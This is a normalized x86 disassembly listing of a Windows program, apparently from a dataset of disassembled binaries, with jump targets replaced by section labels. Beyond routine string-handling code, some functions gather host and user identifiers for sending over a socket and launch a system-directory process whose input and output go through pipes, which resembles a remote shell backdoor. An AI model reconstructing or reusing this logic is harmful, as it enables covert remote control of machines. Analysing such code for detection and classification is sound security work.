sub eax ebx
cmp eax edi
jae r-xdata
call sub_4259a9
test edi edi
jbe r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebx
retn 0x8
mov ecx [ esi + 0x18 ]
push ebp
lea ebp [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov [ esp + 0x14 ] ebp
mov edx [ ebp ]
mov [ esp + 0x14 ] edx
jmp r-xdata
mov edx ebp
mov edx [ ebp ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov [ eax + ebp ] 0x0
pop ebp
mov ebp [ ebp ]
sub eax edi
push eax
mov eax [ esp + 0x18 ]
add eax ebx
add eax edi
push eax
sub ecx ebx
push ecx
add edx ebx
push edx
call sub_414f2e
mov eax [ esi + 0x14 ]
sub eax edi
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] eax
jb r-xdata
sub_4035a0
push ebx
mov ebx eax
push edi
test ebx ebx
je r-xdata
push ebp
mov ebp [ esp + 0x10 ]
mov edi ebp
mov eax esi
call sub_4039e0
test al al
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x8
jb r-xdata
pop ebp
pop edi
mov eax esi
pop ebx
retn 0x4
mov ecx [ esi + 0x18 ]
lea edi [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp ebx ecx
jb r-xdata
xor eax eax
mov [ edi + ebp ] ax
mov edi [ edi ]
add ebp ebp
push ebp
push ebx
add ecx ecx
push ecx
push eax
call sub_4153e7
mov edx [ esp + 0x20 ]
add esp 0x10
cmp [ esi + 0x18 ] 0x8
mov [ esi + 0x14 ] edx
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x14 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx ebx
jbe r-xdata
mov edx [ esp + 0xc ]
sub ebx eax
push edx
sar ebx 0x1
push ebx
mov eax esi
mov ecx esi
call sub_403930
pop edi
pop ebx
retn 0x4
mov eax [ eax ]
sub_403650
push ebp
mov ebp esp
push 0xffffffff
push sub_426130
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x24
call sub_40a5cc
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov edx [ ebp + 0x10 ]
push edx
lea ecx [ esi + 0x8 ]
call sub_403d20
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
sub_4036f0
push 0xffffffff
push sub_426108
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
mov eax [ ecx + 0x18 ]
mov edx 0x9249249
sub edx eax
cmp edx 0x1
jae r-xdata
inc eax
mov [ ecx + 0x18 ] eax
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0x50
retn
push 0x10
push r--data
lea ecx [ esp + 0xc ]
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] 0x0
call sub_403430
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x54 ] 0x0
call sub_401d60
push r--data
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0x28 ] r--data
call sub_415cca
sub_4037b0
push ebp
mov ebp esp
push 0xffffffff
push sub_425fb0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x18 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp edx ecx
jae r-xdata
mov esi eax
jmp r-xdata
xor ebx ebx
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] ebx
cmp ecx ebx
ja r-xdata
mov eax 0xfffffffe
sub eax ecx
cmp ebx eax
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
lea esi [ ecx + ebx ]
push ecx
call sub_40a5cc
add esp 0x4
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] ebx
call sub_414f9c
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_415cca
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] 0x2
call sub_403a40
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
mov ecx [ ebp + 0xc ]
test ecx ecx
jbe r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
lea eax [ edi + 0x4 ]
mov [ eax ] 0x0
mov [ eax ] ebx
mov [ edi + 0x18 ] esi
mov [ edi + 0x14 ] ecx
cmp esi 0x10
jb r-xdata
mov ecx [ edi + 0x4 ]
push ecx
call sub_40a5fb
mov ecx [ ebp + 0xc ]
add esp 0x4
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
mov [ eax + ecx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
push ecx
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_4153e7
mov ecx [ ebp + 0xc ]
add esp 0x10
sub_4038fe
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push 0x0
mov [ esi + 0x4 ] 0x0
call sub_415cca
int3
mov edx [ esi + 0x4 ]
push edx
call sub_40a5fb
add esp 0x4
sub_403930
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov ebx eax
push edi
mov esi ecx
cmp [ ebx + 0x14 ] ebp
jae r-xdata
mov edi [ ebx + 0x14 ]
mov eax [ esp + 0x18 ]
sub edi ebp
cmp eax edi
jae r-xdata
call sub_4259a9
cmp esi ebx
jne r-xdata
mov edi eax
mov eax esi
call sub_4039e0
test al al
je r-xdata
lea ebx [ edi + ebp ]
or eax 0xffffffff
call sub_403aa0
mov eax ebp
xor ebx ebx
call sub_403aa0
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
lea ecx [ ebx + 0x4 ]
mov ecx [ ebx + 0x4 ]
jmp r-xdata
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
cmp [ esi + 0x18 ] 0x8
lea ebp [ esi + 0x4 ]
jb r-xdata
xor eax eax
mov [ ebx + ebp ] ax
mov ebp [ ebp ]
mov edx [ esp + 0x14 ]
lea ecx [ ecx + edx * 2 ]
lea ebx [ edi + edi ]
push ebx
push ecx
mov ecx [ esi + 0x18 ]
lea edx [ ecx + ecx ]
push edx
push eax
call sub_4153e7
add esp 0x10
cmp [ esi + 0x18 ] 0x8
mov [ esi + 0x14 ] edi
jb r-xdata
sub_4039e0
push esi
mov esi eax
cmp edi 0x7ffffffe
jbe r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_425971
test edi edi
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
push esi
call sub_403b30
xor edx edx
cmp edx edi
sbb eax eax
neg eax
pop esi
retn
xor edx edx
cmp edx edi
sbb eax eax
neg eax
pop esi
retn
mov [ esi + 0x14 ] edi
cmp eax 0x8
jb r-xdata
add esi 0x4
xor ecx ecx
mov [ esi ] cx
mov esi [ esi + 0x4 ]
xor ecx ecx
xor edx edx
cmp edx edi
sbb eax eax
mov [ esi ] cx
neg eax
pop esi
retn
sub_403a40
mov ecx [ esp + 0x4 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
push ecx
call sub_40a5cc
add esp 0x4
add esp 0xc
retn 0x4
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x4 ]
mov [ esp + 0x14 ] 0x0
call sub_414f9c
push r--data
lea ecx [ esp + 0x4 ]
push ecx
mov [ esp + 0x8 ] r--data
call sub_415cca
int3
sub_403aa0
sub esp 0x8
push edi
mov edi eax
cmp [ esi + 0x14 ] ebx
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax ebx
cmp eax edi
jae r-xdata
call sub_4259a9
test edi edi
jbe r-xdata
mov edi eax
mov eax esi
pop edi
add esp 0x8
retn
mov ecx [ esi + 0x18 ]
push ebp
lea ebp [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ esp + 0x8 ] ebp
mov edx [ ebp ]
mov [ esp + 0x8 ] edx
jmp r-xdata
mov [ esp + 0xc ] ebp
mov edx [ ebp ]
mov [ esp + 0xc ] edx
jmp r-xdata
cmp ecx 0x8
jb r-xdata
xor ecx ecx
mov [ ebp + eax * 2 ] cx
pop ebp
mov ebp [ ebp ]
mov edx [ esp + 0x8 ]
sub eax edi
add eax eax
push eax
lea eax [ ebx + edi ]
lea eax [ edx + eax * 2 ]
sub ecx ebx
push eax
add ecx ecx
push ecx
mov ecx [ esp + 0x18 ]
lea edx [ ecx + ebx * 2 ]
push edx
call sub_414f2e
mov eax [ esi + 0x14 ]
sub eax edi
add esp 0x10
cmp [ esi + 0x18 ] 0x8
mov [ esi + 0x14 ] eax
jb r-xdata
sub_403b30
push ebp
mov ebp esp
push 0xffffffff
push sub_426060
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x18 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp edx ecx
jae r-xdata
mov esi eax
jmp r-xdata
xor ebx ebx
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] ebx
cmp ecx ebx
ja r-xdata
mov eax 0x7ffffffe
sub eax ecx
cmp ebx eax
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x2
jae r-xdata
xor ecx ecx
lea esi [ ecx + ebx ]
lea eax [ ecx + ecx ]
push eax
call sub_40a5cc
add esp 0x4
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] ebx
call sub_414f9c
push r--data
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x24 ] r--data
call sub_415cca
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
call sub_403cc0
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
mov ecx [ ebp + 0x10 ]
test ecx ecx
jbe r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x4 ]
xor edx edx
mov [ eax ] ebx
mov [ edi + 0x18 ] esi
mov [ edi + 0x14 ] ecx
cmp esi 0x8
jb r-xdata
mov eax [ edi + 0x4 ]
push eax
call sub_40a5fb
mov ecx [ ebp + 0x10 ]
add esp 0x4
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
xor edx edx
mov [ eax + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax ebx
add ecx ecx
push ecx
push eax
lea edx [ esi + esi + 0x2 ]
push edx
push ebx
call sub_4153e7
mov ecx [ ebp + 0x10 ]
add esp 0x10
sub_403c84
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x18 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
push ecx
mov [ esi + 0x4 ] cx
call sub_415cca
int3
mov eax [ esi + 0x4 ]
push eax
call sub_40a5fb
add esp 0x4
sub_403cc0
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x2
jae r-xdata
xor ecx ecx
lea edx [ ecx + ecx ]
push edx
call sub_40a5cc
add esp 0x4
add esp 0x10
retn
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
call sub_414f9c
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call sub_415cca
int3
sub_403d20
push 0xffffffff
push sub_4260e1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x4 ] ecx
mov [ esp + 0x8 ] ecx
xor eax eax
mov [ esp + 0x14 ] eax
cmp ecx eax
je r-xdata
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0x14
retn
push 0xffffffff
mov [ ecx + 0x14 ] eax
xor edx edx
push eax
mov eax [ esp + 0x24 ]
mov [ ecx + 0x18 ] 0x7
mov [ ecx + 0x4 ] dx
call sub_403930
sub_403db0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4262bb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2ac
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2a4 ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2b8 ]
mov [ fs : 0x0 ] eax
lea esi [ esp + 0xc ]
call sub_4012c0
mov [ esp + 0x2c0 ] 0x0
mov eax [ rw-data ]
push eax
mov ebx rw-data
mov ecx esi
call sub_4014b0
mov ecx esi
test al al
jne r-xdata
push ecx
lea edx [ esp + 0x70 ]
push edx
call sub_401f10
mov eax [ esp + 0x64 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
lea ecx [ esp + 0x6c ]
call sub_401fc0
lea ecx [ esp + 0xc ]
call sub_4013b0
xor eax eax
call sub_4013b0
or eax 0xffffffff
jmp r-xdata
mov ecx [ esp + 0x2b8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x2a4 ]
xor ecx esp
call sub_414a33
mov esp ebp
pop ebp
retn 0x4
sub_403e80
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_426278
mov eax [ fs : 0x0 ]
push eax
sub esp 0x9c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x94 ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa8 ]
mov [ fs : 0x0 ] eax
lea esi [ esp + 0x3c ]
call sub_4012c0
mov [ esp + 0xb0 ] 0x0
mov eax [ rw-data ]
push eax
mov ebx rw-data
mov ecx esi
call sub_4014b0
mov ecx esi
test al al
jne r-xdata
push ecx
lea esi [ esp + 0x10 ]
call sub_4044f0
mov edx [ esp + 0x94 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
call sub_4047f0
lea ecx [ esp + 0x3c ]
call sub_4013b0
xor eax eax
call sub_4013b0
or eax 0xffffffff
jmp r-xdata
mov ecx [ esp + 0xa8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x94 ]
xor ecx esp
call sub_414a33
mov esp ebp
pop ebp
retn 0x4
sub_403f70
push ebx
push edi
mov ebx ecx
xor edi edi
mov [ ebx ] r--data
cmp [ ebx + 0x9e50 ] edi
jbe r-xdata
mov edx [ ebx + 0x8 ]
push edx
mov [ ebx ] r--data
call [ CloseHandle@IAT ]
pop edi
pop ebx
retn
push ebp
mov ebp [ TerminateThread@IAT ]
push esi
lea esi [ ebx + 0x210 ]
mov eax [ esi ]
push 0xffffffff
push eax
call ebp
mov ecx [ esi ]
push ecx
call [ CloseHandle@IAT ]
inc edi
add esi 0x4
cmp edi [ ebx + 0x9e50 ]
jb r-xdata
pop esi
pop ebp
sub_403fd0
mov eax [ esp + 0x4 ]
movzx eax [ eax ]
sub eax 0x0
push esi
mov esi ecx
je r-xdata
push 0x1
add esi 0x9e54
push esi
call [ InterlockedExchange@IAT ]
sub eax 0x1
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x50 ]
xor dl dl
mov eax sub_403db0
call sub_404a60
mov ecx [ esi + 0x9e50 ]
mov [ esi + ecx * 4 + 0x210 ] eax
inc [ esi + 0x9e50 ]
pop esi
retn 0x8
sub eax 0x27
jne r-xdata
pop esi
retn 0x8
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + 0x50 ]
mov dl 0x1
mov eax sub_403e80
call sub_404a60
mov edx [ esi + 0x9e50 ]
mov [ esi + edx * 4 + 0x210 ] eax
inc [ esi + 0x9e50 ]
pop esi
retn 0x8
sub_404050
sub esp 0x2a8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2a4 ] eax
push esi
push edi
lea eax [ esp + 0x2c ]
push eax
mov [ esp + 0x2c ] 0x66
mov [ esp + 0x30 ] 0x11c
call [ GetVersionExW@IAT ]
mov ecx 0xa
mov esi r--data
lea edi [ esp + 0x1b0 ]
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x244 ]
push edx
call [ GetComputerNameW@IAT ]
mov edx [ ebx + 0x50 ]
xor eax eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
push edx
mov [ esp + 0x18 ] 0x10
call [ getsockname@IAT ]
mov eax [ esp + 0x1c ]
mov [ esp + 0x148 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0x19
lea esi [ esp + 0x240 ]
lea edi [ esp + 0x14c ]
[ edi ] [ esi ]
mov ecx [ esp + 0x2b4 ]
push edx
lea eax [ esp + 0x1e0 ]
push eax
mov [ esp + 0x1e0 ] ecx
mov [ esp + 0x18 ] 0x32
call [ GetUserNameW@IAT ]
push 0x218
lea ecx [ esp + 0x2c ]
push ecx
push ebx
call sub_401a10
mov ecx [ esp + 0x2ac ]
pop edi
pop esi
xor ecx esp
call sub_414a33
add esp 0x2a8
retn
sub_404150
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_42623b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x9f34
call sub_4185c0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x9f30 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x9f48 ]
mov [ fs : 0x0 ] eax
lea esi [ esp + 0x1c ]
call sub_4012c0
mov [ esp + 0x9f50 ] 0x0
mov edi [ Sleep@IAT ]
mov [ esp + 0x17 ] 0x0
call [ GetTickCount@IAT ]
push 0x185
mov ebx r--data
lea ecx [ esp + 0x20 ]
mov esi eax
call sub_4014b0
test al al
jne r-xdata
xor ebx ebx
call [ GetTickCount@IAT ]
sub eax esi
push eax
lea ebx [ esp + 0x20 ]
call sub_404050
add esp 0x4
push 0x0
push 0x0
push 0x1
mov eax ebx
lea ecx [ esp + 0x88 ]
push 0x0
mov [ esp + 0x8c ] r--data
mov [ esp + 0x90 ] eax
mov [ esp + 0x88 ] ecx
call [ CreateEventW@IAT ]
mov esi [ lstrcpyW@IAT ]
lea edx [ esp + 0x9ed4 ]
mov [ esp + 0x84 ] eax
push edx
lea eax [ esp + 0x90 ]
push eax
mov [ esp + 0x84 ] r--data
call esi
push r--data
push rw-data
call esi
lea ecx [ esp + 0x7c ]
mov [ rw-data ] 0x185
mov [ esp + 0x9ecc ] 0x0
mov [ esp + 0x9ed0 ] 0x0
mov [ esp + 0x78 ] ecx
call [ GetTickCount@IAT ]
mov [ esp + 0x17 ] 0x2
jmp r-xdata
push 0x4
lea eax [ esp + 0x1c ]
push eax
mov ecx 0x1
push 0x80
mov [ esp + 0x24 ] cx
mov ecx [ esp + 0x78 ]
push 0xffff
xor edx edx
push ecx
mov [ esp + 0x2e ] dx
call [ setsockopt@IAT ]
mov edx [ esp + 0x6c ]
push edx
call [ CancelIo@IAT ]
push 0x0
lea eax [ esp + 0x74 ]
push eax
call [ InterlockedExchange@IAT ]
mov ecx [ esp + 0x6c ]
push ecx
call [ closesocket@IAT ]
mov edx [ esp + 0x74 ]
push edx
call [ SetEvent@IAT ]
push esi
mov [ esp + 0x70 ] 0xffffffff
call [ CloseHandle@IAT ]
push 0xa
call edi
inc ebx
cmp ebx 0x2
jl r-xdata
push 0x4
lea eax [ esp + 0x1c ]
push eax
mov ecx 0x1
push 0x80
mov [ esp + 0x24 ] cx
mov ecx [ esp + 0x78 ]
push 0xffff
xor edx edx
push ecx
mov [ esp + 0x2e ] dx
call [ setsockopt@IAT ]
mov edx [ esp + 0x6c ]
push edx
call [ CancelIo@IAT ]
push 0x0
lea eax [ esp + 0x74 ]
push eax
call [ InterlockedExchange@IAT ]
mov ecx [ esp + 0x6c ]
push ecx
call [ closesocket@IAT ]
mov edx [ esp + 0x74 ]
push edx
call [ SetEvent@IAT ]
push esi
mov [ esp + 0x70 ] 0xffffffff
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x7c ]
call sub_403f70
lea ecx [ esp + 0x1c ]
call sub_4013b0
xor eax eax
mov ecx [ esp + 0x9f48 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x9f30 ]
xor ecx esp
call sub_414a33
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
cmp [ esp + 0x17 ] 0x0
jne r-xdata
lea eax [ esp + 0x9ed4 ]
push eax
push 0x0
push 0x1f0003
call [ OpenEventW@IAT ]
mov esi eax
test esi esi
jne r-xdata
jmp r-xdata
lea edx [ esp + 0x9ed4 ]
push edx
push 0x0
push 0x1f0003
call [ OpenEventW@IAT ]
mov esi eax
mov eax [ esp + 0x74 ]
push 0x64
push eax
call [ WaitForSingleObject@IAT ]
push 0x1f4
mov ebx eax
call edi
test esi esi
jne r-xdata
lea ecx [ esp + 0x7c ]
call sub_403f70
jmp r-xdata
sub_404410
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
mov [ esi ] r--data
call [ CloseHandle@IAT ]
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40a5fb
add esp 0x4
sub_404470
push ebp
mov ebp esp
push 0xffffffff
push sub_4260b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edx + 0x4 ]
push ecx
push eax
call sub_401a10
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4044f0
push 0xffffffff
push sub_4261fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x27c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x274 ] eax
push ebx
push ebp
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28c ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x29c ]
xor edi edi
push edi
push edi
push 0x1
mov [ esi ] r--data
mov [ esi + 0x4 ] eax
push edi
mov [ esp + 0x40 ] esi
mov [ eax + 0x5c ] esi
call [ CreateEventW@IAT ]
mov [ esi + 0x8 ] eax
mov [ esp + 0x294 ] edi
xor eax eax
push 0x40
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x3c ]
push edi
push eax
mov [ esi ] r--data
mov [ esp + 0x40 ] edi
call sub_415f60
add esp 0xc
push 0x206
xor eax eax
lea edx [ esp + 0x82 ]
xor ecx ecx
push edi
push edx
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x88 ] cx
call sub_415f60
add esp 0xc
push 0x0
lea ebp [ esi + 0x10 ]
lea ebx [ esi + 0x18 ]
lea eax [ esp + 0x28 ]
mov [ ebp ] edi
mov [ esi + 0x14 ] edi
mov [ ebx ] edi
push eax
lea edi [ esi + 0x1c ]
push edi
push ebp
mov [ edi ] 0x0
mov [ esp + 0x34 ] 0xc
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x3c ] 0x1
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
push 0x0
lea ecx [ esp + 0x28 ]
push ecx
lea eax [ esi + 0x14 ]
push eax
push ebx
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov ebp [ ebp ]
mov ebx [ CloseHandle@IAT ]
test ebp ebp
je r-xdata
push 0x44
lea edx [ esp + 0x38 ]
push 0x0
push edx
call sub_415f60
xor eax eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
add esp 0xc
lea eax [ esp + 0x34 ]
push eax
call [ GetStartupInfoW@IAT ]
mov eax [ edi ]
mov edx [ ebx ]
mov [ esp + 0x74 ] eax
mov [ esp + 0x70 ] eax
push 0x104
lea eax [ esp + 0x80 ]
xor ecx ecx
push eax
mov [ esp + 0x3c ] 0x44
mov [ esp + 0x6c ] cx
mov [ esp + 0x68 ] 0x101
mov [ esp + 0x74 ] edx
call [ GetSystemDirectoryW@IAT ]
lea eax [ esp + 0x7c ]
add eax 0xfffffffe
lea esp [ esp ]
mov eax [ esi + 0x14 ]
mov edi [ CloseHandle@IAT ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
je r-xdata
push ebp
call ebx
mov cx [ eax + 0x2 ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] edx
mov edx [ r--data ]
mov [ eax + 0x8 ] ecx
mov cx [ r--data ]
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] cx
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x38 ]
push eax
push 0x0
push 0x0
push 0x20
push 0x1
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0xa0 ]
push ecx
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
push eax
call edi
mov eax esi
mov ecx [ esp + 0x28c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebp
pop ebx
mov ecx [ esp + 0x274 ]
xor ecx esp
call sub_414a33
add esp 0x288
retn 0x4
push edi
call ebx
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov [ esi + 0x24 ] ecx
push 0x1
lea ecx [ esp + 0x17 ]
mov edx esi
mov [ esi + 0x20 ] eax
mov [ esp + 0x17 ] 0x80
call sub_404470
mov edx [ esi + 0x8 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
push 0x96
call [ Sleep@IAT ]
xor dl dl
mov ecx esi
mov eax sub_4048f0
call sub_404a60
mov [ esi + 0x28 ] eax
xor dl dl
mov ecx esi
mov eax sub_4049c0
call sub_404a60
mov [ esi + 0x2c ] eax
mov edx [ ebp ]
mov ebp [ CloseHandle@IAT ]
push edx
call ebp
mov eax [ esi + 0x14 ]
push eax
call ebp
mov ecx [ ebx ]
push ecx
call ebp
mov edx [ edi ]
push edx
call ebp
jmp r-xdata
push ebx
call edi
jmp r-xdata
sub_4047f0
mov eax [ esi + 0x28 ]
push edi
mov edi [ TerminateThread@IAT ]
push 0x0
push eax
mov [ esi ] r--data
call edi
